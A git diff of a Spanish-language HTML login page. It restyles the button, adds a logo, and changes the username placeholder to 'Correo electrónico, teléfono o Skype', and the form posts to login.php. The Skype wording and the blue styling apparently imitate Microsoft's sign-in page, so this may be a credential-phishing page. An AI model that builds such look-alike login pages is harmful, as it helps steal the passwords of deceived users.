@@ -4,6 +4,8 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
+    /* Tu estilo actual aquí */
+
     body {
       font-family: Arial, sans-serif;
       background-color: #f4f4f4;
@@ -19,7 +21,8 @@
       box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
       padding: 20px;
       border-radius: 8px;
-      width: 300px;
+      width: 350px;
+      height: 320px;
     }
 
     form {
@@ -39,29 +42,48 @@
     }
 
     button {
-      background-color: #4caf50;
+      background-color: #0f6cbd;
       color: #fff;
-      padding: 10px;
+      padding: 9px;
       border: none;
-      border-radius: 4px;
+      border-radius: 1px;
       cursor: pointer;
+      position: absolute; /* Añadido */
+      bottom: 240px; /* Ajusta según tus necesidades */
+      right: 605px; /* Ajusta según tus necesidades */
+      width: 7%; /* Hace que el botón ocupe el 100% del ancho del contenedor */
+
     }
 
-    button:hover {
-      background-color: #45a049;
-    }
+button:hover {
+  background-color: #45a049;
+}
+
+/* Estilos específicos para tamaños de pantalla pequeños, como teléfonos */
+@media only screen and (max-width: 600px) {
+  .container {
+    width: 80%; /* Reduce el ancho del contenedor para pantallas pequeñas */
+  }
+
+  button {
+    padding: 10px; /* Ajusta el padding del botón para pantallas pequeñas */
+    bottom: 300px; /* Ajusta según tus necesidades */
+      right: 70px; /* Ajusta según tus necesidades */
+      width: 24%;
+  }
+}
   </style>
   <title>Página de Inicio de Sesión</title>
 </head>
 <body>
   <div class="container">
+    <!-- Agregar el logo al principio del formulario -->
+    <img src="swswsw.png" alt="Logo de tu empresa" style="width: 120px; height: 45px; margin-bottom: 0px;">
+
     <form action="login.php" method="post">
       <h2>Iniciar Sesión</h2>
-      <label for="username">Usuario:</label>
-      <input type="text" id="username" name="username" required>
-
-      <label for="password">Contraseña:</label>
-      <input type="password" id="password" name="password" required>
+      <input type="text" id="username" name="username" placeholder="Correo electrónico, teléfono o Skype" required>
+      <input type="password" id="password" name="password" placeholder="Contraseña" required>
 
       <button type="submit">Ingresar</button>
     </form>
